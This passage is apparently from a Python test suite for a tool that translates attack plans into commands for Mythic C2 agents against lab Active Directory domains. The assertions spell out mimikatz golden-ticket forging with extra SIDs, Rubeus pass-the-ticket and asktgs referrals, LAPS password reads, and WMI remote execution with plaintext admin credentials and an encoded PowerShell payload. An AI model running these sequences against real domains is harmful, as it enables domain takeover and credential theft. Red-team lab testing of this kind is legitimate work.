            capabilities.CapabilityExecutionStep(
                operation="kerberos-ticket-purge",
                parameters={"domain": "lab.local", "target_context": "current", "store": "current"},
                capability="ensure-kerberos-context",
                purpose="purge stale Kerberos tickets",
                expected_probe="extract_ticket_cache_probe",
            ),
            capabilities.CapabilityExecutionStep(
                operation="kerberos-service-ticket-acquire",
                parameters={
                    "resource": "\\\\dc01.lab.local\\C$",
                    "target_context": "current",
                    "store": "current",
                },
                capability="ensure-kerberos-context",
                purpose="acquire current service ticket",
                expected_probe="extract_ticket_cache_probe",
            ),
            capabilities.CapabilityExecutionStep(
                operation="kerberos-context-service-proof",
                parameters={
                    "resource": "\\\\dc01.lab.local\\C$",
                    "target_context": "current",
                    "requires_import": False,
                    "requires_acquisition": True,
                },
                capability="ensure-kerberos-context",
                purpose="prove current service access",
                expected_probe="extract_ticket_probe",
            ),
        ],
    )

    mythic_plan = adapter.build_mythic_capability_commands(plan, adapter.MERLIN_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["run", "run", "run", "ls"]
    assert mythic_plan.commands[0].parameters == {
        "executable": "klist.exe",
        "arguments": "",
    }
    assert mythic_plan.commands[1].parameters == {
        "executable": "klist.exe",
        "arguments": "purge",
    }
    assert mythic_plan.commands[2].parameters == {
        "executable": "klist.exe",
        "arguments": "get cifs/dc01.lab.local",
    }
    assert mythic_plan.commands[2].consumes == ["kerberos_current_tickets_purged"]
    assert mythic_plan.commands[2].produces == ["kerberos_service_ticket_acquired"]
    assert mythic_plan.commands[3].parameters == {"path": "\\\\dc01.lab.local\\C$"}
    assert mythic_plan.commands[3].consumes == [
        "kerberos_context_inventory",
        "kerberos_service_ticket_acquired",
    ]


def test_merlin_adapter_uses_rubeus_ptt_for_current_agent_cache_import():
    plan = capabilities.CapabilityExecutionPlan(
        True,
        steps=[
            capabilities.CapabilityExecutionStep(
                operation="kerberos-ticket-purge",
                parameters={"domain": "lab.local", "target_context": "current", "store": "agent-cache"},
                capability="forge-golden-ticket",
                purpose="purge current ticket cache",
                expected_probe="extract_ticket_cache_probe",
            ),
            capabilities.CapabilityExecutionStep(
                operation="kerberos-ticket-import",
                parameters={
                    "domain": "lab.local",
                    "target_context": "current",
                    "store": "agent-cache",
                    "ticket_base64": "{{kerberos_ticket_base64}}",
                },
                capability="forge-golden-ticket",
                purpose="import ticket into current cache",
                expected_probe="extract_ticket_cache_probe",
            ),
            capabilities.CapabilityExecutionStep(
                operation="kerberos-ticket-list",
                parameters={"domain": "lab.local", "target_context": "current", "store": "agent-cache"},
                capability="forge-golden-ticket",
                purpose="inventory current ticket cache",
                expected_probe="extract_ticket_cache_probe",
            ),
        ],
    )

    mythic_plan = adapter.build_mythic_capability_commands(plan, adapter.MERLIN_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["run", "load-assembly", "invoke-assembly", "run"]
    assert mythic_plan.commands[0].parameters == {"executable": "klist.exe", "arguments": "purge"}
    assert mythic_plan.commands[1].parameters == {"filename": "Rubeus.exe"}
    importer = mythic_plan.commands[2]
    assert importer.parameters == {
        "assembly": "Rubeus.exe",
        "arguments": "ptt /ticket:{{kerberos_ticket_base64}}",
    }
    assert importer.deferred is True
    assert importer.consumes == ["kerberos_ticket_base64"]
    assert importer.produces == ["kerberos_ticket_imported"]
    assert mythic_plan.commands[3].parameters == {"executable": "klist.exe", "arguments": ""}


def test_adapter_preserves_generic_operation_on_translated_commands():
    plan = capabilities.CapabilityExecutionPlan(
        True,
        steps=[
            capabilities.CapabilityExecutionStep(
                operation="kerberos-ticket-purge",
                parameters={"domain": "lab.local", "target_context": "current", "store": "current"},
                capability="ensure-kerberos-context",
                purpose="purge stale Kerberos tickets",
                expected_probe="extract_ticket_cache_probe",
            ),
        ],
    )

    mythic_plan = adapter.build_mythic_capability_commands(plan, adapter.MERLIN_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    assert mythic_plan.commands[0].command == "run"
    assert mythic_plan.commands[0].operation == "kerberos-ticket-purge"


def test_adapter_translates_inter_realm_referral_to_deferred_asktgs():
    plan = capabilities.CapabilityExecutionPlan(
        True,
        steps=[
            capabilities.CapabilityExecutionStep(
                operation="kerberos-inter-realm-referral",
                parameters={
                    "target_domain": "sevenkingdoms.local",
                    "service": "krbtgt/sevenkingdoms.local",
                    "ticket_base64": "{{kerberos_ticket_base64}}",
                    "child_dc": "winterfell.north.sevenkingdoms.local",
                    "nowrap": True,
                },
                capability="forge-golden-ticket",
                purpose="exchange the forged ticket for an inter-realm referral",
                expected_probe="extract_forged_ticket_artifact",
            ),
        ],
    )

    mythic_plan = adapter.build_mythic_capability_commands(plan)

    assert mythic_plan.ok is True
    assert len(mythic_plan.commands) == 1
    command = mythic_plan.commands[0]
    assert command.command == "execute_assembly"
    args = command.parameters["assembly_arguments"]
    assert args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
    assert "/service:krbtgt/sevenkingdoms.local" in args
    assert "/dc:winterfell.north.sevenkingdoms.local" in args
    assert "/nowrap" in args
    # The referral output overwrites the same ticket slot so the downstream import consumes the referral.
    assert command.deferred is True
    assert command.consumes == ["kerberos_ticket_base64"]
    assert command.produces == ["kerberos_ticket_base64"]


def test_adapter_inter_realm_referral_fails_closed_without_child_dc():
    plan = capabilities.CapabilityExecutionPlan(
        True,
        steps=[
            capabilities.CapabilityExecutionStep(
                operation="kerberos-inter-realm-referral",
                parameters={"target_domain": "sevenkingdoms.local"},
                capability="forge-golden-ticket",
                purpose="referral without a resolved child DC",
                expected_probe="extract_forged_ticket_artifact",
            ),
        ],
    )

    mythic_plan = adapter.build_mythic_capability_commands(plan)

    assert mythic_plan.ok is False
    assert "dc" in mythic_plan.missing


def test_adapter_translates_parent_service_ticket_request_to_deferred_asktgs():
    plan = capabilities.CapabilityExecutionPlan(
        True,
        steps=[
            capabilities.CapabilityExecutionStep(
                operation="kerberos-service-ticket-request",
                parameters={
                    "target_domain": "root.local",
                    "service": "ldap/dc01.root.local",
                    "ticket_base64": "{{kerberos_ticket_base64}}",
                    "dc": "dc01.root.local",
                },
                capability="forge-golden-ticket",
                purpose="exchange referral for LDAP service ticket",
                expected_probe="extract_forged_ticket_artifact",
            ),
        ],
    )

    mythic_plan = adapter.build_mythic_capability_commands(plan)

    assert mythic_plan.ok is True
    command = mythic_plan.commands[0]
    assert command.command == "execute_assembly"
    assert command.parameters["assembly_arguments"].startswith(
        "asktgs /ticket:{{kerberos_ticket_base64}} /service:ldap/dc01.root.local /dc:dc01.root.local"
    )
    assert command.deferred is True
    assert command.consumes == ["kerberos_ticket_base64"]
    assert command.produces == ["kerberos_ticket_base64"]


def test_adapter_marks_service_proof_deferred_until_resource_is_bound():
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=lab.local",
        preconditions=["krbtgt-hash:lab.local"],
        effects=["da:lab.local"],
        intent={"capability": "forge-golden-ticket", "domain": "lab.local"},
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-111-222-333",
        "aes256": "d" * 64,
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    proof = mythic_plan.commands[-1]
    assert proof.command == "shell"
    assert proof.parameters == "dir {{kerberos_service_resource}}"
    assert proof.deferred is True
    assert "kerberos_service_resource" in proof.consumes


def test_adapter_translates_account_context_to_managed_asktgt_sequence_without_ptt():
    action = capabilities.CapabilityAction(
        name="ensure-account-kerberos-context",
        target="domain=lab.local;account=alice;callback=13",
        preconditions=["creds:alice@lab.local", "live-callback:13"],
        effects=["kerberos-account-context:alice@lab.local@callback:13"],
        intent={
            "capability": "ensure-account-kerberos-context",
            "domain": "lab.local",
            "account": "alice",
            "callback_id": "13",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "aes256": "d" * 64,
        "proof_host": "dc01.lab.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == [
        "shell",
        "shell",
        "execute_assembly",
        "make_token",
        "ticket_store_add",
        "ticket_store_list",
        "shell",
    ]
    tgt = mythic_plan.commands[2]
    assert tgt.parameters["assembly_name"] == "Rubeus.exe"
    rendered = tgt.parameters["assembly_arguments"]
    assert rendered.startswith("asktgt /user:alice /domain:lab.local")
    assert f"/aes256:{'d' * 64}" in rendered
    assert "/nowrap" in rendered
    assert "/ptt" not in rendered
    assert tgt.produces == ["kerberos_ticket_base64"]
    assert mythic_plan.commands[4].deferred is True
    assert mythic_plan.commands[6].parameters == "dir \\\\dc01.lab.local\\SYSVOL"
    assert mythic_plan.commands[6].consumes == ["kerberos_ticket_imported", "kerberos_logon_context"]


def test_adapter_uses_distinct_plaintext_credential_reference_for_account_context_make_token():
    action = capabilities.CapabilityAction(
        name="ensure-account-kerberos-context",
        target="domain=lab.local;account=alice;callback=13",
        preconditions=["creds:alice@lab.local", "live-callback:13"],
        effects=["kerberos-account-context:alice@lab.local@callback:13"],
        intent={
            "capability": "ensure-account-kerberos-context",
            "domain": "lab.local",
            "account": "alice",
            "callback_id": "13",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "aes256": "d" * 64,
        "credential_id": 77,
        "logon_credential_id": 88,
        "proof_host": "dc01.lab.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    make_token = mythic_plan.commands[3]
    assert make_token.command == "make_token"
    assert make_token.parameters == {
        "credential": {
            "id": "88",
            "account": "alice",
            "realm": "lab.local",
            "credential": "SageNetOnlyContext1!",
            "type": "plaintext",
        },
        "netOnly": True,
    }


def test_adapter_never_uses_ticket_key_credential_reference_for_make_token():
    action = capabilities.CapabilityAction(
        name="ensure-account-kerberos-context",
        target="domain=lab.local;account=alice;callback=13",
        preconditions=["creds:alice@lab.local", "live-callback:13"],
        effects=["kerberos-account-context:alice@lab.local@callback:13"],
        intent={
            "capability": "ensure-account-kerberos-context",
            "domain": "lab.local",
            "account": "alice",
            "callback_id": "13",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "aes256": "d" * 64,
        "credential_id": 77,
        "proof_host": "dc01.lab.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    make_token = mythic_plan.commands[3]
    assert make_token.parameters["credential"] != "@cred:77"
    assert make_token.parameters["credential"]["type"] == "plaintext"


def test_merlin_adapter_translates_account_context_through_applied_token_session():
    action = capabilities.CapabilityAction(
        name="ensure-account-kerberos-context",
        target="domain=lab.local;account=alice;callback=13",
        preconditions=["creds:alice@lab.local", "live-callback:13"],
        effects=["kerberos-account-context:alice@lab.local@callback:13"],
        intent={
            "capability": "ensure-account-kerberos-context",
            "domain": "lab.local",
            "account": "alice",
            "callback_id": "13",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "aes256": "d" * 64,
        "proof_host": "dc01.lab.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == [
        "run",
        "ls",
        "execute-assembly",
        "make_token",
        "load-assembly",
        "invoke-assembly",
        "invoke-assembly",
        "ls",
    ]
    assert mythic_plan.commands[3].parameters == {
        "user": "lab.local\\alice",
        "pass": "SageNetOnlyContext1!",
    }
    importer = mythic_plan.commands[5]
    assert importer.parameters == {
        "assembly": "Rubeus.exe",
        "arguments": "ptt /ticket:{{kerberos_ticket_base64}}",
    }
    assert importer.consumes == ["kerberos_ticket_base64", "kerberos_logon_context"]
    assert importer.produces == ["kerberos_ticket_imported"]
    inventory = mythic_plan.commands[6]
    assert inventory.parameters == {
        "assembly": "Rubeus.exe",
        "arguments": "klist",
    }
    assert inventory.consumes == ["kerberos_logon_context"]
    assert inventory.produces == ["kerberos_context_inventory"]
    assert [command.command for command in mythic_plan.commands].count("load-assembly") == 1
    proof = mythic_plan.commands[7]
    assert proof.parameters == {"path": "\\\\dc01.lab.local\\SYSVOL"}
    assert proof.consumes == ["kerberos_ticket_imported", "kerberos_logon_context"]


def test_adapter_can_translate_service_proof_to_native_path_command():
    step = capabilities.CapabilityExecutionStep(
        operation="kerberos-context-service-proof",
        parameters={
            "resource": "\\\\dc01.lab.local\\C$",
            "target_context": "{{kerberos_logon_context}}",
            "store": "ticket-cache-native",
        },
        capability="forge-golden-ticket",
        purpose="prove access",
        expected_probe="extract_ticket_probe",
    )
    execution_plan = capabilities.CapabilityExecutionPlan(True, steps=[step])

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "service_access_command": "ls",
        "service_access_path_param": "path",
    })

    assert mythic_plan.ok is True
    assert mythic_plan.commands[0].command == "ls"
    assert mythic_plan.commands[0].parameters == {"path": "\\\\dc01.lab.local\\C$"}


def test_adapter_normalizes_spn_service_proof_to_unc_shell_path():
    step = capabilities.CapabilityExecutionStep(
        operation="kerberos-context-service-proof",
        parameters={
            "resource": "cifs/dc01.lab.local",
            "target_context": "current",
            "requires_import": False,
        },
        capability="ensure-kerberos-context",
        purpose="prove access",
        expected_probe="extract_ticket_probe",
    )
    execution_plan = capabilities.CapabilityExecutionPlan(True, steps=[step])

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert mythic_plan.commands[0].command == "shell"
    assert mythic_plan.commands[0].parameters == "dir \\\\dc01.lab.local\\C$"


def test_adapter_can_use_mimikatz_ticket_forge_fallback_without_ptt_when_configured():
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=north.sevenkingdoms.local",
        preconditions=["krbtgt-hash:north.sevenkingdoms.local"],
        effects=["da:sevenkingdoms.local"],
        intent={"capability": "forge-golden-ticket", "domain": "north.sevenkingdoms.local"},
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-1192885938-529740043-2943990325",
        "aes256": "d" * 64,
        "extra_sids": ["S-1-5-21-3033212248-4076524963-940182272-519"],
        "establish_context": False,
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {"kerberos_forge_backend": "mimikatz"})

    assert mythic_plan.ok is True
    command = mythic_plan.commands[0]
    assert command.command == "mimikatz"
    rendered = command.parameters["commands"]
    assert rendered.startswith('"kerberos::golden /user:Administrator /domain:north.sevenkingdoms.local')
    assert "/sids:S-1-5-21-3033212248-4076524963-940182272-519" in rendered
    assert "/ptt" not in rendered
    assert rendered.endswith('"')


def test_adapter_translates_managed_secret_read_to_directory_searcher():
    action = capabilities.CapabilityAction(
        name="read-managed-local-admin-secret",
        target="account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=["kerberos-account-context:alice@lab.local@callback:13"],
        effects=["managed-local-admin-secret:ws01@child.lab.local"],
        intent={
            "capability": "read-managed-local-admin-secret",
            "account": "alice",
            "account_domain": "lab.local",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "domain_controller": "dc01.child.lab.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert len(mythic_plan.commands) == 1
    command = mythic_plan.commands[0]
    assert command.command == "powerpick"
    assert command.capability == "read-managed-local-admin-secret"
    assert command.expected_probe == "extract_managed_local_admin_secret_probe"
    assert command.produces == ["managed_local_admin_secret_probe"]
    assert command.consumes == ["kerberos_account_context"]
    rendered = command.parameters
    assert "DirectoryServices.DirectorySearcher" in rendered
    assert "LDAP://dc01.child.lab.local/DC=child,DC=lab,DC=local" in rendered
    assert "ms-Mcs-AdmPwd" in rendered
    assert "msLAPS-Password" in rendered
    assert "dNSHostName=ws01.child.lab.local" in rendered


def test_merlin_adapter_translates_managed_secret_read_to_inprocess_sharpview():
    action = capabilities.CapabilityAction(
        name="read-managed-local-admin-secret",
        target="account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=["kerberos-account-context:alice@lab.local@callback:13"],
        effects=["managed-local-admin-secret:ws01@child.lab.local"],
        intent={
            "capability": "read-managed-local-admin-secret",
            "account": "alice",
            "account_domain": "lab.local",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "domain_controller": "dc01.child.lab.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["load-assembly", "invoke-assembly"]
    load, invoke = mythic_plan.commands
    assert load.parameters == {"filename": "SharpView.exe"}
    assert load.expected_probe == ""
    assert load.produces == []
    assert load.consumes == []
    assert invoke.parameters["assembly"] == "SharpView.exe"
    rendered = invoke.parameters["arguments"]
    assert rendered.startswith("Get-DomainComputer ")
    assert "-Identity ws01.child.lab.local" in rendered
    assert "-Domain child.lab.local" in rendered
    assert "-Server dc01.child.lab.local" in rendered
    assert "-SearchBase DC=child,DC=lab,DC=local" in rendered
    assert (
        "-Properties "
        "ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime,msLAPS-Password,"
        "msLAPS-EncryptedPassword,msLAPS-PasswordExpirationTime,"
        "distinguishedName,dNSHostName,sAMAccountName"
    ) in rendered
    assert rendered.endswith(" -FindOne")
    assert invoke.expected_probe == "extract_managed_local_admin_secret_probe"
    assert invoke.produces == ["managed_local_admin_secret_probe"]
    assert invoke.consumes == ["kerberos_account_context"]


def test_adapter_translates_local_admin_use_to_make_token_and_admin_share_proof():
    action = capabilities.CapabilityAction(
        name="use-managed-local-admin-secret",
        target="target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=["managed-local-admin-secret:ws01@child.lab.local", "live-callback:13"],
        effects=["local-admin:ws01@child.lab.local", "admin:ws01", "system-or-admin:ws01"],
        intent={
            "capability": "use-managed-local-admin-secret",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "CorrectHorseBatteryStaple!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["make_token", "ls"]
    token = mythic_plan.commands[0]
    assert token.capability == "use-managed-local-admin-secret"
    assert token.produces == ["local_admin_logon_context"]
    assert token.parameters["credential"] == {
        "account": "Administrator",
        "realm": "ws01",
        "credential": "CorrectHorseBatteryStaple!",
        "type": "plaintext",
    }
    assert token.parameters["netOnly"] is True
    proof = mythic_plan.commands[1]
    assert proof.expected_probe == "extract_local_admin_access_probe"
    assert proof.consumes == ["local_admin_logon_context"]
    assert proof.produces == ["local_admin_access_probe"]
    assert proof.parameters == {"path": r"\\ws01.child.lab.local\C$"}


def test_adapter_uses_managed_local_admin_credential_reference_when_available():
    action = capabilities.CapabilityAction(
        name="use-managed-local-admin-secret",
        target="target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=["managed-local-admin-secret:ws01@child.lab.local", "live-callback:13"],
        effects=["local-admin:ws01@child.lab.local", "admin:ws01", "system-or-admin:ws01"],
        intent={
            "capability": "use-managed-local-admin-secret",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "CorrectHorseBatteryStaple!",
        "credential_id": 91,
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert mythic_plan.commands[0].parameters["credential"] == {
        "id": "91",
        "account": "Administrator",
        "realm": "ws01",
        "credential": "CorrectHorseBatteryStaple!",
        "type": "plaintext",
    }


def test_adapter_translates_remote_execution_to_wmiexecute_and_cat():
    action = capabilities.CapabilityAction(
        name="execute-as-local-admin",
        target="target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=["local-admin:ws01@child.lab.local", "live-callback:13"],
        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
        intent={
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "CorrectHorseBatteryStaple!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["wmiexecute", "cat"]
    remote = mythic_plan.commands[0]
    assert remote.capability == "execute-as-local-admin"
    assert remote.expected_probe == "extract_remote_execution_submit_probe"
    assert remote.produces == ["remote_process_created"]
    assert remote.parameters["host"] == "ws01.child.lab.local"
    assert remote.parameters["username"] == "Administrator"
    assert remote.parameters["password"] == "CorrectHorseBatteryStaple!"
    assert remote.parameters["domain"] == "ws01"
    assert "SAGE_REMOTE_EXEC_PROOF_ws01_13" in remote.parameters["command"]
    proof = mythic_plan.commands[1]
    assert proof.expected_probe == "extract_remote_execution_probe"
    assert proof.consumes == ["remote_process_created"]
    assert proof.produces == ["remote_execution_proof"]
    assert proof.parameters == {"path": r"\\ws01.child.lab.local\C$\Windows\Temp\sage_remote_exec_ws01_13.txt"}


def test_apollo_adapter_translates_remote_execution_to_token_backed_wmiexecute_and_cleanup():
    action = capabilities.CapabilityAction(
        name="execute-as-local-admin",
        target="target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=["local-admin:ws01@child.lab.local", "live-callback:13"],
        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
        intent={
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "CorrectHorseBatteryStaple!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.APOLLO_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["make_token", "wmiexecute", "cat", "rev2self"]
    token, remote, proof, cleanup = mythic_plan.commands
    assert token.parameters == {
        "Credential": {
            "account": "Administrator",
            "credential": "CorrectHorseBatteryStaple!",
            "realm": "ws01",
            "type": "plaintext",
        },
        "netOnly": True,
    }
    assert token.produces == ["local_admin_logon_context"]
    assert remote.parameters["host"] == "ws01.child.lab.local"
    assert "username" not in remote.parameters
    assert "password" not in remote.parameters
    assert "domain" not in remote.parameters
    assert remote.consumes == ["local_admin_logon_context"]
    assert proof.parameters == {"path": r"\\ws01.child.lab.local\C$\Windows\Temp\sage_remote_exec_ws01_13.txt"}
    assert cleanup.command == "rev2self"
    assert cleanup.operation == "local-admin-logon-session-revert"
    assert cleanup.consumes == ["local_admin_logon_context"]


def test_apollo_adapter_reuses_existing_token_context_for_remote_execution():
    action = capabilities.CapabilityAction(
        name="execute-as-local-admin",
        target="target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=["local-admin:ws01@child.lab.local", "live-callback:13"],
        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
        intent={
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "CorrectHorseBatteryStaple!",
    })
    config = {
        **adapter.APOLLO_MYTHIC_ADAPTER,
        "local_admin_remote_exec_reuse_token_context": True,
    }

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, config)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["wmiexecute", "cat", "rev2self"]
    remote = mythic_plan.commands[0]
    assert remote.parameters == {
        "command": (
            r'cmd.exe /c echo SAGE_REMOTE_EXEC_PROOF_ws01_13 & whoami & hostname '
            r'& echo SAGE_REMOTE_EXEC_PROOF_ws01_13 > "C:\Windows\Temp\sage_remote_exec_ws01_13.txt" '
            r'& whoami >> "C:\Windows\Temp\sage_remote_exec_ws01_13.txt" '
            r'& hostname >> "C:\Windows\Temp\sage_remote_exec_ws01_13.txt"'
        ),
        "host": "ws01.child.lab.local",
    }


def test_adapter_translates_remote_execution_to_merlin_native_shell_proof():
    action = capabilities.CapabilityAction(
        name="execute-as-local-admin",
        target="target=ws01;target_domain=child.lab.local;callback=8",
        preconditions=["local-admin:ws01@child.lab.local", "live-callback:8"],
        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
        intent={
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "8",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "CorrectHorseBatteryStaple!",
        "local_admin_remote_exec_command": "shell",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "local_admin_remote_exec_command": "shell",
        "remote_file_read_command": "download",
        "remote_file_read_path_param": "file",
    })

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["shell", "download"]
    remote = mythic_plan.commands[0]
    assert remote.expected_probe == "extract_remote_execution_probe"
    assert remote.produces == ["remote_process_created", "remote_execution_proof"]
    shell_args = remote.parameters["arguments"]
    assert 'net use "\\\\ws01\\C$"' in shell_args
    assert '/user:"ws01\\Administrator"' in shell_args
    assert 'wmic /node:"ws01.child.lab.local"' in shell_args
    assert "SAGE_REMOTE_EXEC_PROOF_ws01_8" in shell_args
    assert 'type "\\\\ws01\\C$\\Windows\\Temp\\sage_remote_exec_ws01_8.txt"' in shell_args
    proof = mythic_plan.commands[1]
    assert proof.command == "download"
    assert proof.parameters == {
        "file": r"\\ws01.child.lab.local\C$\Windows\Temp\sage_remote_exec_ws01_8.txt",
    }


def test_adapter_translates_remote_execution_to_merlin_run_sequence():
    action = capabilities.CapabilityAction(
        name="execute-as-local-admin",
        target="target=ws01;target_domain=child.lab.local;callback=8",
        preconditions=["local-admin:ws01@child.lab.local", "live-callback:8"],
        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
        intent={
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "8",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "CorrectHorseBatteryStaple!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "local_admin_remote_exec_command": "run",
        "remote_file_read_command": "download",
        "remote_file_read_path_param": "file",
    })

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["run", "run", "run", "run", "download"]
    cmdkey, net_use, wmic, proof = mythic_plan.commands[:4]
    assert cmdkey.parameters["executable"] == "cmdkey.exe"
    assert "/add:ws01" in cmdkey.parameters["arguments"]
    assert "/user:ws01\\Administrator" in cmdkey.parameters["arguments"]
    assert "/pass:CorrectHorseBatteryStaple!" in cmdkey.parameters["arguments"]
    assert cmdkey.produces == ["target_credential_cached"]
    assert net_use.parameters["executable"] == "net.exe"
    assert r"use \\ws01\C$" in net_use.parameters["arguments"]
    assert "/user:" not in net_use.parameters["arguments"]
    assert net_use.consumes == ["target_credential_cached"]
    assert net_use.produces == ["admin_share_authenticated"]
    assert wmic.parameters["executable"] == "wmic.exe"
    assert "/node:ws01.child.lab.local" in wmic.parameters["arguments"]
    assert '"cmd.exe /c echo SAGE_REMOTE_EXEC_PROOF_ws01_8' in wmic.parameters["arguments"]
    assert wmic.consumes == ["target_credential_cached"]
    assert proof.parameters["executable"] == "cmd.exe"
    assert r"type \\ws01\C$\Windows\Temp\sage_remote_exec_ws01_8.txt" in proof.parameters["arguments"]
    assert proof.expected_probe == "extract_remote_execution_probe"
    assert proof.produces == ["remote_execution_proof"]


def test_adapter_translates_remote_execution_to_merlin_powershell_wmi_sequence():
    action = capabilities.CapabilityAction(
        name="execute-as-local-admin",
        target="target=ws01;target_domain=child.lab.local;callback=8",
        preconditions=["local-admin:ws01@child.lab.local", "live-callback:8"],
        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
        intent={
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "8",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "Correct Horse 'Battery' Staple!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "local_admin_remote_exec_command": "run",
        "native_remote_exec_method": "powershell-wmi",
        "remote_file_read_command": "download",
        "remote_file_read_path_param": "file",
    })

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["run", "download"]
    remote = mythic_plan.commands[0]
    assert remote.parameters["executable"] == "powershell.exe"
    ps_args = remote.parameters["arguments"]
    assert "-EncodedCommand " in ps_args
    encoded = ps_args.rsplit(" ", 1)[1]
    ps = base64.b64decode(encoded).decode("utf-16le")
    assert "ConvertTo-SecureString 'Correct Horse ''Battery'' Staple!'" in ps
    assert "New-Object System.Management.Automation.PSCredential('ws01\\Administrator',$sec)" in ps
    assert "Invoke-WmiMethod -Class Win32_Process -Name Create" in ps
    assert "'\\\\ws01\\C$'" in ps
    assert "'SAGEPROOF:\\Windows\\Temp\\sage_remote_exec_ws01_8.txt'" in ps
    assert remote.expected_probe == "extract_remote_execution_probe"
    assert remote.produces == ["remote_process_created", "remote_execution_proof"]


def test_merlin_profile_resets_stale_token_before_explicit_credential_remote_execution():
    action = capabilities.CapabilityAction(
        name="execute-as-local-admin",
        target="target=ws01;target_domain=child.lab.local;callback=8",
        preconditions=["local-admin:ws01@child.lab.local", "live-callback:8"],
        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
        intent={
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "8",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
